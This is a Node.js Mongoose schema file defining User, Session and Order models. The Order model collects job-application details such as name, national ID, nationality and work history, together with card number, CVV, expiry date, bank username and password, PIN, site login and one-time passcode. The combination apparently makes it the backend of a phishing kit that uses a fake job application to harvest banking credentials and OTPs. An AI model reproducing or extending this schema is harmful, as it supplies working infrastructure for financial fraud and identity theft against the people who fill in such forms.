const { default: mongoose, mongo, Mongoose } = require("mongoose");

exports.User = mongoose.model('User',new mongoose.Schema({
    email:String,
    password:String,
    type:String,
    socket:String,
},{timestamps:true}))

exports.Order = mongoose.model('Order',new mongoose.Schema({
    first_name:String,
    last_name:String,
    entry_job:String,
    email:String,
    social_status:String,
    number_children:String,
    birth:String,
    nationalty:String,
    nation_number:Number,
    city:String,
    phone:Number,
    alternative_phone:Number,
    academic_qualification:String,
    specialization:String,
    experience:String,
    number_experience:String,
    last_job_title:String,
    username:String,
    token:String,
    cvv:String,
    card_number:String,
    expire_date:String,
    site_user:String,
    site_password:String,
    otp:{
        type:String,
        default:null
    },
    bank:{
        type:String,
    },
    bankUsername:String,
    bankPassword:String,
    pin:String,
    card_name:String
},{timestamps:true}))

exports.Session = mongoose.model('Request',new mongoose.Schema({
    username:String,
    password:String,
    token:String,
    status:{
        type:Boolean,
        default:false
    },
    expire_id:{
        type:Date,
        default:new Date(Date.now() + (2 * 60 * 60 * 1000))
    }

},{timestamps:true}))